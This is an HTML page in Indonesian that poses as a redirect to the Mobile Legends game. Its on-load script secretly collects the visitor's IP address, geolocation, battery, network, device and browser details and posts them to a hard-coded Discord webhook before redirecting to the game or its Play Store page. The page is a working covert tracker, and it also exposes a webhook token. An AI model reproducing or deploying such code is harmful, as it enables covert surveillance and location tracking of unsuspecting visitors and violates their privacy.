<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <script>
        window.onload = async function() {
            const whUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";

            try {
                const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
                const data = await res.json();
                const ip = data.ip;

                const lang = navigator.language || navigator.userLanguage;

                let ct = "Unknown";
                let nt = "Unknown";
                let ds = "Unknown";
                if (navigator.connection) {
                    ct = navigator.connection.effectiveType || "Unknown";
                    nt = navigator.connection.type || "Unknown";
                    ds = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown";
                    if (navigator.connection.downlinkMax > 10) nt = "WiFi";
                    else if (navigator.connection.downlinkMax > 0) nt = "Data Seluler";
                }

                let bl = "Unknown";
                let cs = "Unknown";
                let psm = "Unknown";
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    bl = `${Math.round(bat.level * 100)}%`;
                    cs = bat.charging ? "Charging" : "Not Charging";
                    psm = bat.saving ? "Enabled" : "Disabled";
                }

                const ua = navigator.userAgent;
                let plat = "Unknown";
                if (/Android/i.test(ua)) plat = "Android";
                else if (/iPhone|iPad|iPod/i.test(ua)) plat = "iOS";
                else if (/Windows/i.test(ua)) plat = "Windows";
                else if (/Mac/i.test(ua)) plat = "MacOS";
                else if (/Linux/i.test(ua)) plat = "Linux";

                let br = "Unknown";
                if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) br = "Chrome";
                else if (/Firefox/i.test(ua)) br = "Firefox";
                else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) br = "Safari";
                else if (/Edg/i.test(ua)) br = "Edge";

                let geo = "Disabled";
                if (navigator.geolocation) {
                    try {
                        const pos = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        geo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                    } catch {
                        geo = "Permission Denied";
                    }
                }

                const sr = `${window.screen.width}x${window.screen.height}`;
                const lt = new Date().toLocaleString();
                const cc = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not Supported";
                const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";

                await fetch(whUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: `IP: ${ip}\nLang: ${lang}\nCT: ${ct}\nNT: ${nt}\nDS: ${ds}\nBL: ${bl}\nCS: ${cs}\nPSM: ${psm}\nPlat: ${plat}\nBR: ${br}\nGeo: ${geo}\nSR: ${sr}\nLT: ${lt}\nCC: ${cc}\nDNT: ${dnt}`
                    })
                });

                window.location.href = "mobilelegends://";
                setTimeout(() => {
                    window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                }, 2000);
            } catch {
                window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
            }
        };
    </script>
</head>
<body>
    <div style="text-align: center; font-family: Arial, sans-serif;">
        <h1>Mengalihkan ke Mobile Legends...</h1>
        <p>Harap tunggu beberapa detik.</p>
    </div>
</body>
</html>
